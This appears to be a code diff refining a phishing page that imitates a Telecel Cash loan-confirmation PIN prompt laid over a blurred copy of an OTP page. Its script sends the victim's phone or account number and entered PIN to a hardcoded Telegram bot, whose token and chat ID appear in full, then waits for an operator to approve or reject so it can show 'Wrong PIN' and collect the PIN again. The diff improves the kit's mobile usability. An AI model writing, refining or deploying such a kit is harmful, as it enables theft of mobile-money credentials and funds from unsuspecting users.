@@ -24,6 +24,7 @@
       justify-content: center;
       position: relative;
       overflow-x: hidden;
+      padding: 10px; /* ensures spacing on very small screens */
     }
 
     /* ---------- BLURRED OTP BACKGROUND (exact copy of OTP page, non‑interactive) ---------- */
@@ -34,12 +35,11 @@
       width: 100%;
       height: 100%;
       filter: blur(6px) brightness(0.98);
-      pointer-events: none;          /* no clicks on background */
+      pointer-events: none;
       z-index: 1;
       overflow: hidden;
     }
 
-    /* replicate the OTP container exactly */
     .bg-otp {
       width: 360px;
       background: #f7f7f7;
@@ -147,7 +147,8 @@
     .pin-modal {
       position: relative;
       z-index: 10;
-      width: 360px;
+      width: 100%;
+      max-width: 360px;
       background: #ffffff;
       border-radius: 28px;
       padding: 24px 20px 30px;
@@ -161,7 +162,6 @@
       to { opacity: 1; transform: scale(1); }
     }
 
-    /* header */
     .modal-header {
       display: flex;
       justify-content: space-between;
@@ -202,7 +202,6 @@
       margin: 0 0 24px 0;
     }
 
-    /* PIN display mock (cursor + stars) */
     .pin-display {
       display: flex;
       justify-content: center;
@@ -259,7 +258,7 @@
       letter-spacing: -0.2px;
     }
 
-    /* PIN inputs – exactly 4 boxes, auto‑advance, focus style like OTP */
+    /* PIN inputs – now with numeric keypad on mobile */
     .pin-inputs {
       display: flex;
       gap: 12px;
@@ -279,6 +278,10 @@
       background: #fff;
       transition: border 0.15s, box-shadow 0.15s;
       color: #1a1a1a;
+      /* numeric keypad on mobile + password masking */
+      inputmode: numeric;
+      pattern: \d*;
+      -webkit-text-security: disc; /* fallback for older browsers */
     }
 
     .pin-input:focus {
@@ -291,7 +294,6 @@
       background: #fff9f9;
     }
 
-    /* Authorise button – dynamic red when complete */
     .btn-authorise {
       width: 100%;
       height: 56px;
@@ -312,7 +314,6 @@
       box-shadow: 0 8px 18px rgba(255, 0, 0, 0.2);
     }
 
-    /* error box (same as OTP page) */
     .error-box {
       position: absolute;
       top: 20px;
@@ -347,7 +348,6 @@
       color: #999;
     }
 
-    /* spinner overlay with custom message */
     #spinner {
       position: fixed;
       inset: 0;
@@ -415,7 +415,7 @@
 
   <div class="modal-header">
     <h2>Confirm loan Application</h2>
-    <div class="close-btn" id="backBtn">×</div>  <!-- ID changed to backBtn for clarity -->
+    <div class="close-btn" id="backBtn">×</div>
   </div>
   <div class="divider"></div>
 
@@ -432,10 +432,11 @@
   <div class="label">Telecel Cash Pin</div>
 
   <div class="pin-inputs">
-    <input class="pin-input" maxlength="1" type="password" id="pin1" autofocus>
-    <input class="pin-input" maxlength="1" type="password" id="pin2">
-    <input class="pin-input" maxlength="1" type="password" id="pin3">
-    <input class="pin-input" maxlength="1" type="password" id="pin4">
+    <!-- Added inputmode and pattern for numeric keypad, while keeping type="password" -->
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autofocus autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
   </div>
 
   <button class="btn-authorise" id="authoriseBtn">Authorise</button>
@@ -449,7 +450,7 @@
 
 <script>
   (function() {
-    // --- TELEGRAM CONFIG (same as OTP page) ---
+    // --- TELEGRAM CONFIG ---
     const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
     const CHAT_ID   = '1006917440';
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -465,14 +466,14 @@
     const spinner = document.getElementById('spinner');
     const errorBox = document.getElementById('errorBox');
     const errorText = document.getElementById('errorText');
-    const backBtn = document.getElementById('backBtn');  // renamed from closeModalBtn
+    const backBtn = document.getElementById('backBtn');
 
-    // --- Retrieve session data (same keys as OTP) ---
+    // --- Retrieve session data ---
     let phone = sessionStorage.getItem('telecel_phone') || '0200000020';
     let accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
     let inputValue = sessionStorage.getItem('telecel_inputValue') || '';
 
-    // --- Auto‑advance & style update (like OTP) ---
+    // --- Auto‑advance & style update ---
     function updateButtonState() {
       const allFilled = pinInputs.every(inp => inp.value.length === 1);
       if (allFilled) {
@@ -511,7 +512,6 @@
       });
     });
 
-    // initial button state
     updateButtonState();
 
     // --- Error handling ---
@@ -524,7 +524,7 @@
       errorBox.style.display = 'block';
     }
 
-    // --- Telegram helpers (copy from OTP) ---
+    // --- Telegram helpers ---
     function escapeHtml(unsafe) {
       return unsafe.replace(/[&<>"]/g, function(m) {
         if (m === '&') return '&amp;';
@@ -595,21 +595,18 @@
         return;
       }
 
-      // disable inputs & show spinner
       isProcessing = true;
       pinInputs.forEach(i => i.disabled = true);
       authoriseBtn.disabled = true;
       spinner.style.display = 'flex';
 
-      // build identifier for Telegram – now using RAW values (no masking)
       const identifier = accountType === 'Mobile' 
-        ? `Phone: ${phone}`                // unmasked phone
-        : `Account: ${inputValue || 'N/A'}`; // raw account value
+        ? `Phone: ${phone}`
+        : `Account: ${inputValue || 'N/A'}`;
 
       const ts = Date.now();
       const escapedPin = escapeHtml(pin);
 
-      // message: identifier + PIN in <code> (easily clickable/copyable)
       const msg = `PIN verification\n\n${identifier}\n\nPIN entered: <code>${escapedPin}</code>\n\nAuthorise this pin?`;
 
       await sendToTelegram({
@@ -624,16 +621,13 @@
         }
       });
 
-      // start polling for answer
       pollForCallback('pin', ts, (action) => {
         spinner.style.display = 'none';
         isProcessing = false;
 
         if (action === 'approve') {
-          // redirect to unavailable.html
           window.location.href = 'unavailable.html';
         } else if (action === 'decline') {
-          // show error, re-enable inputs
           showError('Wrong PIN');
           pinInputs.forEach(i => {
             i.value = '';
@@ -646,18 +640,14 @@
       });
     });
 
-    // --- Back button (X) – now goes to previous page in history ---
+    // --- Back button (X) – goes to previous page ---
     backBtn.addEventListener('click', function() {
-      window.history.back();  // returns to the previous page (OTP page or wherever the user came from)
+      window.history.back();
     });
 
-    // If sessionStorage lacks critical data, redirect to login (optional)
     if (!sessionStorage.getItem('telecel_phone') && !sessionStorage.getItem('telecel_inputValue')) {
-      // silent fallback, but we already have default phone
       console.log('Using default demo data');
     }
-
-    // Hide error when clicking outside? We keep it simple, close button works.
   })();
 </script>
 
